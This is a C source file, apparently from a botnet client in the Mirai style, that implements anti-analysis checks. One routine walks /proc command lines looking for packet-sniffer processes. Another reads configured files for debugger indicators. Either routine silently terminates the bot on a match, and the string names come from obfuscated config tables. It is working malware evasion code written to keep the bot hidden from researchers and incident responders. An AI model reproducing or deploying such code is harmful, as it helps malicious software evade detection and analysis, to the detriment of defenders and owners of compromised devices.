#include "bot/config/table.h"
#include "bot/definitions.h"
#include "bot/utils/string.h"
#include "bot/utils/tokenizer.h"
#include <ctype.h>
#include <dirent.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

static inline void antidebug_check_sniffers() {
  ptokenizer_t tokenizer = tokenizer_new(table_retrieve(TABLE_ADBG_SNIFFERS, NULL), ",");
  if (!tokenizer) return;

  DIR *proc = opendir(table_retrieve(TABLE_KILLER_PROC, NULL));
  if (!proc) {
    tokenizer_free(tokenizer);
    table_lock(TABLE_ADBG_SNIFFERS);
    return;
  }

  struct dirent *entry;
  bool found = false;

  while ((entry = readdir(proc))) {
    if (!isdigit(entry->d_name[0])) continue;

    char buffer[256] = {0};
    strcpy(buffer, table_retrieve(TABLE_KILLER_PROC, NULL));
    strcat(buffer, entry->d_name);
    strcat(buffer, table_retrieve(TABLE_KILLER_CMDLINE, NULL));

    int fd = open(buffer, O_RDONLY);
    if (fd < 0) continue;

    ssize_t n = read(fd, buffer, sizeof(buffer));
    close(fd);
    if (n <= 0) continue;

    for (int i = 0; i < tokenizer->size; i++) {
      if (str_search(buffer, tokenizer->tokens[i], n, strlen(tokenizer->tokens[i])) > 0) {
        found = true;
        break;
      }
    }

    if (found) break;
  }

  closedir(proc);
  tokenizer_free(tokenizer);
  table_lock(TABLE_ADBG_SNIFFERS);

  if (found) {
    LOG_FATAL("Sniffer found! Exiting!");
    exit(0);
  }
}

void antidebug_init() {
  antidebug_check_sniffers();

  ptokenizer_t files = tokenizer_new(table_retrieve(TABLE_ADBG_FILES, NULL), ",");
  if (!files) return;

  ptokenizer_t indicators = tokenizer_new(table_retrieve(TABLE_ADBG_INDICATORS, NULL), ",");
  if (!indicators) {
    tokenizer_free(files);
    return;
  }

  char buffer[256] = {0};
  bool found = false;

  for (int i = 0; i < files->size; i++) {
    int fd = open(files->tokens[i], O_RDONLY);
    if (fd < 0) continue;

    ssize_t n = read(fd, buffer, sizeof(buffer));
    close(fd);
    if (n <= 0) continue;

    if (str_search(buffer, indicators->tokens[i], n, strlen(indicators->tokens[i])) > 0) {
      found = true;
      break;
    }
  }

  tokenizer_free(files);
  tokenizer_free(indicators);

  if (found) {
    LOG_FATAL("Debugger found! Exiting!");
    exit(0);
  }
}
